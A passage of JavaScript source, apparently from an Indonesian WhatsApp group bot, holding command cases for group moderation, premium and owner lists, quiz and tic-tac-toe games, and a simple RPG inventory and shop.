await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'addprem':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285649455626`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await haikal.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
break
case 'delprem':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285649455626`)
yau = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(yau)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${yau} Telah Di Hapus Premium!`)
break
case 'listpremium':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
teksiu = '*List Premium*\n\n'
for (let haikal of prem) {
teksiu += `- ${haikal}\n`
}
teksiu += `\n*Total : ${prem.length}*`
haikal.sendMessage(m.chat, { text: teksiu.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'add': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'public': {
if (!isPrem) return replyprem(mess.premium)
haikal.public = true
m.reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isPrem) return replyprem(mess.premium)
haikal.public = false
m.reply('Sukses Change To Self')
}
break
case 'listcmd': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'cekbot': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

🌷 RESPONS  ${latensi.toFixed(4)}
🌷 AKTIF Selama : ${runtime(process.uptime())}

Nama : Haikal

Support : 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚

Umur : 13th

Kota : Bandung

Negara : Indonesia

YouTube : https://youtube.com/c/HwModsWa857

Telegram : https://t.me/haikal857

Group Telegram : https://t.me/HaikalHw

Instagram : https://www.instagram.com/hikal_857/?hl=id
`
haikal.sendMessage(m.chat, { image: ppnyauser, caption: respon }, { quoted:m })
}
break

//=================================================//
case 'antilink': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'ban': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return m.reply('*User has been banned*')
banned.push(orgnye)
m.reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return m.reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
m.reply(`*Success Removing Banned Users*`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'addowner':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285649455626`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285649455626`)
yaki = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Owner!!!`)
break
case 'listowner':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
teksooo = '*List Owner*\n\n'
for (let haikal of owner) {
teksooo += `- ${haikal}\n`
}
teksooo += `\n*Total : ${owner.length}*`
haikal.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
case 'listmenu':
if (!m.isGroup) throw groupon(from)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessageNya = {
text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
footer: "List By Geekz",
buttonText: "Click Here",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsge = await haikal.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!m.isGroup) throw groupon(from)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case 'dellist':
if (!m.isGroup) throw groupon(from)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return m.reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break
case 'updatelist':
if (!m.isGroup) throw groupon(from)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break
//=================================================//
    case 'family100': {
    if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if ('family100'+m.chat in _family100) {
    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
    throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
    id: 'family100'+m.chat,
    pesan: await haikal.sendText(m.chat, hasil, m),
    ...random,
    terjawab: Array.from(random.jawaban, () => false),
    hadiah: 6,
}
    }
    break
case 'kuismath': case 'math': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./src/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
haikal.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
    kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
    delete kuismath[m.sender.split('@')[0]]
}
    }
    break
case 'ttc': case 'ttt': case 'tictactoe': {
    let TicTacToe = require("./lib/tictactoe")
    this.game = this.game ? this.game : {}
    if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
    let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
    if (room) {
    m.reply('Partner ditemukan!')
    room.o = m.chat
    room.game.playerO = m.sender
    room.state = 'PLAYING'
    let arr = room.game.render().map(v => {
    return {
    X: '❌',
    O: '⭕',
    1: '1️⃣',
    2: '2️⃣',
    3: '3️⃣',
    4: '4️⃣',
    5: '5️⃣',
    6: '6️⃣',
    7: '7️⃣',
    8: '8️⃣',
    9: '9️⃣',
    }[v]
    })
    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
    if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
    await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
    } else {
    room = {
    id: 'tictactoe-' + (+new Date),
    x: m.chat,
    o: '',
    game: new TicTacToe(m.sender, 'o'),
    state: 'WAITING'
    }
    if (text) room.name = text
    m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
    this.game[room.id] = room
    }
    }
    break
    case 'delttc': case 'delttt': {
    let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
    if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
    delete this.game[roomnya.id]
    m.reply(`Berhasil delete session room tictactoe !`)
    }
    break
    case 'suitpvp': case 'suit': {
    this.suit = this.suit ? this.suit : {}
    let poin = 10
    let poin_lose = 10
    let timeout = 60000
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
    if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
    let id = 'suit_' + new Date() * 1
    let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
    this.suit[id] = {
    chat: await haikal.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
    id: id,
    p: m.sender,
    p2: m.mentionedJid[0],
    status: 'wait',
    waktu: setTimeout(() => {
    if (this.suit[id]) haikal.sendText(m.chat, `_Waktu suit habis_`, m)
    delete this.suit[id]
    }, 60000), poin, poin_lose, timeout
    }
    }
    break
case 'tebak': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await haikal.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
haikal.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break

//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
m.reply(teksehmazeh)
}
break
 case 'leaderboard': { 
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟 Ikan* : ${i.ikan}\n`
txt += `*🐔 Ayam* : ${i.ayam}\n`
txt += `*🐇 Kelinci* : ${i.kelinci}\n`
txt += `*🐑 Domba* : ${i.domba}\n`
txt += `*🐄 Sapi* : ${i.sapi}\n`
txt += `*🐘 Gajah* : ${i.gajah}\n\n`
}
 m.reply(txt)
}
 break
case 'mining': case 'mine':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return m.reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang Lagi ⛏️'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: './baseikal/gambarnye/tambang.jpg' },
 caption: caption,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
m.reply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`) 
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return m.reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return m.reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { m.reply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'ikan'){
 if (isIkan < anu) return m.reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return m.reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return m.reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return m.reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sapi'){
